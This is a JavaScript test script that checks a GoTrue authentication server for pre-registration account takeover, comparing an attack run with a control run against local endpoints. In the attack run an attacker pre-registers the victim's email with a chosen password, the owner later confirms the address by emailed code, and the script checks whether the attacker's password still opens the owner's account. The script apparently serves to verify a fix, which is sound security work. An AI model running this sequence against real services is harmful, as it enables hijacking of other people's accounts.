// Pre-registration account-takeover check against GoTrue, driven only through the
// public auth API. Run it with the fix (trigger) absent, then present.
const A = 'http://127.0.0.1:54890', M = 'http://127.0.0.1:54891';
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const post = async (p, b) => { const r = await fetch(A + p, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(b) }); return { status: r.status, body: await r.json().catch(() => ({})) }; };
async function codeFor(email, after) {
  for (let i = 0; i < 30; i++) {
    await sleep(600);
    const list = await (await fetch(`${M}/api/v1/search?query=${encodeURIComponent('to:' + email)}`)).json();
    const m = (list.messages ?? []).filter((x) => new Date(x.Created) > after).sort((a, b) => new Date(b.Created) - new Date(a.Created))[0];
    if (!m) continue;
    const full = await (await fetch(`${M}/api/v1/message/${m.ID}`)).json();
    const code = ((full.Text || '') + ' ' + (full.HTML || '')).match(/\b\d{6,8}\b/)?.[0];
    if (code) return { code, subject: m.Subject };
  }
  return {};
}
const signInPw = (email, password) => post('/token?grant_type=password', { email, password });
async function run(label, withAttacker) {
  const victim = `clerk-${label}-${Date.now()}@example.test`, pw = 'attacker-chose-this-9';
  console.log(`\n== ${label}: ${withAttacker ? 'attacker registers the address first' : 'control, no attacker'}`);
  if (withAttacker) {
    const s = await post('/signup', { email: victim, password: pw });
    console.log('1 attacker POST /signup with a password:', s.status, s.body.id ? `user ${s.body.id.slice(0, 8)}` : (s.body.error_code ?? s.body.msg));
    const early = await signInPw(victim, pw);
    console.log('  attacker password sign-in before the owner confirms:', early.status, early.body.access_token ? 'SESSION' : (early.body.error_code ?? early.body.msg));
    await sleep(1500); // stay under the mailer's 1/s frequency
  }
  const t0 = new Date(Date.now() - 1000);
  const otp = await post('/otp', { email: victim, create_user: true });
  const mail = await codeFor(victim, t0);
  console.log('2 owner requests a code (POST /otp):', otp.status, '| code', mail.code ? 'received' : 'MISSING');
  const v = await post('/verify', { type: 'email', email: victim, token: mail.code });
  const owner = v.body.user?.id ?? v.body.id;
  console.log('3 owner enters the code (POST /verify):', v.status, v.body.access_token ? `signed in as ${owner?.slice(0, 8)}` : (v.body.error_code ?? v.body.msg));
  const late = await signInPw(victim, pw);
  const took = !!late.body.access_token && late.body.user?.id === owner;
  console.log('4 attacker password sign-in after the owner confirmed:', late.status, late.body.access_token ? `SESSION as ${late.body.user.id.slice(0, 8)}${took ? " (the owner's account)" : ''}` : (late.body.error_code ?? late.body.msg));
  return took;
}
const takeover = await run('attack', true);
const control = await run('control', false);
console.log(`\nRESULT: takeover ${takeover ? 'REPRODUCED' : 'blocked'}; control ${control ? 'UNEXPECTED SESSION' : 'no password session, as expected'}`);
